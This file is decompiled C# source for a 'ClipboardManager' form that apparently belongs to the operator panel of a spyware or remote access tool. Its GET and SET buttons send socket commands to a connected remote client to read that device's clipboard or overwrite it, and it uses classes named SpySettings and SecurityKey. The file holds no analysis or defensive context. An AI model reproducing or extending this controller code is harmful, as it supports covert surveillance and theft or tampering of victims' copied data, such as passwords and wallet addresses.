using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000042 RID: 66
[DesignerGenerated]
public partial class ClipboardManager : Form
{
	// Token: 0x060002F2 RID: 754 RVA: 0x0004DDD8 File Offset: 0x0004BFD8
	private void ClipboardManager_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\20.ico");
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
	}

	// Token: 0x060002F3 RID: 755 RVA: 0x0004DE28 File Offset: 0x0004C028
	public ClipboardManager()
	{
		base.Load += this.ClipboardManager_Load;
		this.Title = "null";
		this.RectInputText0 = new List<Rectangle>();
		this.InitializeComponent();
		this.Font = reso.f;
	}

	// Token: 0x060002F4 RID: 756 RVA: 0x0004DE74 File Offset: 0x0004C074
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x060002F5 RID: 757 RVA: 0x0004DEBC File Offset: 0x0004C0BC
	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (this.RectInputText0.Count > 0)
		{
			foreach (Rectangle rect in this.RectInputText0)
			{
				if (rect.Width > 0)
				{
					e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), rect);
				}
			}
		}
	}

	// Token: 0x060002F6 RID: 758 RVA: 0x0004DF54 File Offset: 0x0004C154
	private void BTN_SET_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".info",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.resultClient,
					Data.SPL_SOCKET,
					"set",
					Data.SPL_DATA,
					this.BoxClipboard.Text
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060002F7 RID: 759 RVA: 0x0004E020 File Offset: 0x0004C220
	private void BTN_GET_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".info",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getClipboard,
					Data.SPL_SOCKET,
					"get",
					Data.SPL_DATA,
					"null"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x04000394 RID: 916
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	// Token: 0x04000395 RID: 917
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	// Token: 0x04000396 RID: 918
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BTN_GET")]
	private Button _BTN_GET;

	// Token: 0x04000397 RID: 919
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BTN_SET")]
	private Button _BTN_SET;

	// Token: 0x04000398 RID: 920
	public TcpClient Client;

	// Token: 0x04000399 RID: 921
	public Client classClient;

	// Token: 0x0400039A RID: 922
	public string Title;

	// Token: 0x0400039B RID: 923
	private List<Rectangle> RectInputText0;
}
